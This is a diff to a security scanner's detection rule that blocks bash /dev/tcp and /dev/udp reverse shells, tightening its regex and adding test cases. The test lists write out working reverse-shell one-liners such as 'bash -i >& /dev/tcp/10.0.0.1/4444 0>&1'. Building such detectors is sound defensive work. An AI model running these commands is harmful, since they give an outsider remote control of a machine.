@@ -1,14 +1,21 @@
-# Reverse shell via the bash /dev/tcp or /dev/udp device file.
+# Reverse shell via the bash /dev/tcp or /dev/udp device file. Only a redirect
+# or exec into the device counts (>& > <> < &>, exec 3<>, bash -i); text that
+# merely names the path (an echo, a commit message) does not.
 id: reverse-shell-dev-tcp
 severity: block
 quoted: true
 category: reverse_shell
-match: /\/dev\/(tcp|udp)\/[0-9]/
+match: /(?:>&?|<>?|&>)\s*\/dev\/(?:tcp|udp)\/|\bbash\s+-i\b[^;&\n]*\/dev\/(?:tcp|udp)\//
 reason: opens a reverse shell through a bash /dev/tcp or /dev/udp device file
 tests:
   match:
     - bash -c "bash -i >& /dev/tcp/1.2.3.4/4444 0>&1"
     - "sh -c 'bash -i >& /dev/tcp/1.2.3.4/4444 0>&1'"
     - bash -i >& /dev/tcp/10.0.0.1/4444 0>&1
+    - exec 3<>/dev/tcp/10.0.0.1/4444
+    - cat <&3 < /dev/tcp/10.0.0.1/80
   no_match:
     - curl https://example.com/api
+    - git commit -m "block /dev/tcp/1 reverse shells"
+    - echo "/dev/tcp/1.2.3.4/80"
+    - ls /dev/tcp/1.2.3.4
